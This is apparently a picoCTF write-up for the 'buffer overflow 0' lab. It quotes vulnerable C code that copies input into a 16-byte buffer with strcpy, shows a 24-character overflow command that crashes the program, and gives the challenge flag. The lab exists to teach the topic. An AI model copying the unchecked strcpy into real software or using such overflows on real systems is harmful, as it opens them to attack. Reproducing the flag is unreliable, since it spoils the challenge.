# buffer overflow 0
## Question
> Let's start off simple, can you overflow the right buffer in this [program](files/vuln) to get the flag? You can also find it in `/problems/buffer-overflow-0_0_6461b382721ccca2318b1d981d363924` on the shell server. [Source](files/vuln.c). 

## Hint
>How can you trigger the flag to print?

>If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

# Solution
Let's see what the [source code](files/vuln.c) looks like.

We see that a custom segfault signal is defined in the `sigsegv` function, which will display the flag.
```c
void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}
```

The `main` function is expecting an argument to be passed to it. It is passed to the `vuln` function
```c
  if (argc > 1) {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
```

Now, let's see what the vuln function looks like (this is where the vulnerability is).
```c
void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}
```

It creates a buffer of 16 bytes to store the input passed as argument, which we will be able to overflow because the user input's length is not checked.

OK, let's try this:
~~~~
$ ./vuln $(python -c "print 'A'*24")
picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}
~~~~

# Flag
`picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}`
